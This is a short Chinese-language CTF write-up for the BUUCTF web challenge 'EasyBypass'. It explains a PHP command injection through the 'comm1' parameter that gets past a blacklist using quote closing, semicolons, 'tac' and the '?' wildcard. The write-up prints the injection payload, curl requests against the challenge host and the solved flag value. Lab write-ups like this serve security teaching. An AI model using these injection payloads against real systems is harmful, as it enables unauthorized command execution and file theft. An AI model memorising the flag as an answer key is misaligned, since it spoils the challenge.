---
title: "EasyBypass"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [command-injection, filter-bypass, wildcard]
vulnerability: 命令注入 + 黑名单绕过
solved: true
flag: "flag{e6d53978-c7e1-491d-a856-efed01c1a9fb}"
---

# EasyBypass

## 题目概述
PHP 命令注入题，通过 GET 参数 `comm1` 和 `comm2` 拼接执行 `file` 命令，需要绕过黑名单过滤读取 `/flag`。

## 信息收集
访问页面直接返回源码，分析发现：
- 两个参数被双引号包裹后拼接到 `file "$comm1" "$comm2"` 执行
- `comm1` 黑名单：`' \` \* \n \t \r { } ( ) < & @ |` + 关键字 `cat ls flag` 等
- `comm2` 黑名单更严格，额外禁止 `"` 和 `;`

## 漏洞分析
**关键发现：**
1. `comm1` 允许 `"` 双引号，可以闭合外层双引号
2. `comm1` **没有过滤 `;` 分号**，可以用于命令分隔
3. `comm1` **没有过滤 `tac`**（cat 的反向版本）
4. `comm1` 过滤了 `*` 但 **没有过滤 `?`** 通配符
5. `flag` 关键字被过滤，可用 `/f??g` 绕过

## 利用过程
构造 payload：
```
comm1 = ";tac /f??g;"
```

实际执行的命令：
```bash
file "";tac /f??g;"" ""
```

- `file ""` 执行失败（无害）
- `tac /f??g` 读取 flag 文件（`?` 匹配 `l` 和 `a`）
- `"" ""` 空参数（无害）

**完整请求：**
```bash
curl "http://target/?comm1=%22%3btac%20/f??g%3b%22&comm2="
```

## 复现步骤
```bash
# 访问获取源码
curl -v "http://b25b4635-88bb-4d50-b0d3-fc81cf0f0227.node5.buuoj.cn:81/"

# 列出根目录确认 flag 位置
curl -s "http://b25b4635-88bb-4d50-b0d3-fc81cf0f0227.node5.buuoj.cn:81/?comm1=%22%3bdir%20/%3b%22&comm2="

# 读取 flag
curl -s "http://b25b4635-88bb-4d50-b0d3-fc81cf0f0227.node5.buuoj.cn:81/?comm1=%22%3btac%20/f??g%3b%22&comm2="
```

**Flag:** `flag{e6d53978-c7e1-491d-a856-efed01c1a9fb}`
